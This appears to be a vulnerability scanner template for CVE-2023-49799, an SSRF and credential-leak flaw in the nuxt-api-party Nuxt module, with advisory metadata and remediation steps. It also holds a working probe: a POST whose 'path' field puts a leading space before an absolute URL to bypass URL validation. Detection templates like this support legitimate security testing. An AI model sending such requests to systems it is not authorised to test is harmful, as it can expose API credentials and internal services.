id: CVE-2023-49799

info:
  name: nuxt-api-party - SSRF & Credentials Leak
  author: chae1xx1os, eeche, persona-twotwo, soonghee2
  severity: high
  description: |
    nuxt-api-party allows developers to proxy requests to an API without exposing credentials to the client. This vulnerability allows an attacker to change the baseURL of the request, potentially leading to credentials being leaked or SSRF.
  impact: |
    The vulnerability allows an attacker to:
    - Leak sensitive API credentials by bypassing URL validation.
    - Perform Server-Side Request forgery (SSRF) attacks, potentially accessing internal services or resources not intended to be exposed.
  remediation: |
    To remediate this vulnerability:
    - Update `nuxt-api-party` to version `0.22.0` or later.
    - Revert to the previous method of detecting absolute URLs by checking the origin of the URL.
    - Ensure that any input used to construct URLs is properly sanitized to remove any leading or trailing whitespace that could bypass URL validation.
  reference:
    - https://github.com/johannschopplich/nuxt-api-party/security/advisories/GHSA-3wfp-253j-5jxv
    - https://nvd.nist.gov/vuln/detail/CVE-2023-49799
    - https://github.com/johannschopplich/nuxt-api-party/commit/72762a200fc19d997a0f84bce578c28698dc5270
    - https://fetch.spec.whatwg.org/
    - https://fetch.spec.whatwg.org/#http-whitespace-byte
    - https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L31
    - https://infra.spec.whatwg.org/#byte-sequence
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-49799
  tags: cve, cve203, ssrf, credentials, leak, web, nuxt-api-party

variables:
  payload: "https://google.com"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/__api_party/MyEndpoint"
      - "{{BaseURL}}/api/__api_party/__proto__"

    body: |
      {
        "path": " {{payload}}"
      }

    headers:
      Content-Type: application/json

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Request received"
      - type: word
        part: header
        words:
          - "Content-Type: application/json"